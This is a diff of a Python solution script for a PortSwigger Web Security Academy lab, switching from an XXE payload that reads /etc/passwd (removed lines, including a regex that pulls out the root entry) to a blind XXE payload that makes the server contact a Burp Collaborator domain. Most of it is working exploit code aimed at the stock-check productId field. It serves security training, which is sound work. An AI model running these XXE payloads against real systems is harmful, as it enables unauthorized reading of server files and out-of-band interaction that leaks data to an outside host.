@@ -2,13 +2,13 @@
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
-# Date: 14/10/2023
+# Date: 15/10/2023
 #
-# Lab: Exploiting XXE using external entities to retrieve files
+# Lab: Blind XXE with out-of-band interaction
 #
-# Steps: 1. Inject payload into 'productId' XML element to retrieve the content of
-#           /etc/passwd using an external entity
-#        2. Extract the first line as a proof
+# Steps: 1. Inject payload into 'productId' XML element to issue a DNS lookup to
+#           burp collaborator using an external entity
+#        2. Check your burp collaborator for the DNS lookup
 #
 #########################################################################################
 
@@ -18,21 +18,22 @@
 ###########
 import requests
 from colorama import Fore
-import re
-
 
 #########
 # Main
 #########
 
 # change this to your lab URL
-url = "https://0a59001d032a345786dbd75400bf0068.web-security-academy.net"
+url = "https://0a1e0044030862ae8121a258006400e3.web-security-academy.net"
+
+# change this to your collaborator domain
+collaborator = "c9m2rj6sl798d3167gx8j694pvvmjd72.oastify.com"
 
 print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "productId")
 
-# payload to retreive the content of /etc/passwd
-payload = """<?xml version="1.0" encoding="UTF-8"?>
-            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+# payload to issue a DNS lookup to burp collaborator using an external entity
+payload = f"""<?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{collaborator}">]>
             <stockCheck>
                 <productId>
                     &xxe;
@@ -56,12 +57,9 @@ except:
     print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve the content of /etc/passwd using an external entity.. " + Fore.GREEN + "OK")
-
-# extract the first line of /etc/passwd
-first_line = re.findall("(root.*)\n", injection.text)[0]
-
-print(Fore.WHITE + "⦗2⦘ Extracting the first line as a proof.. " +  Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
+print(Fore.WHITE + "❯ Injecting payload to issue a DNS lookup to burp collaborator using an external entity.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "🗹 Check your burp collaborator for the DNS lookup")
 print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
+
 
 
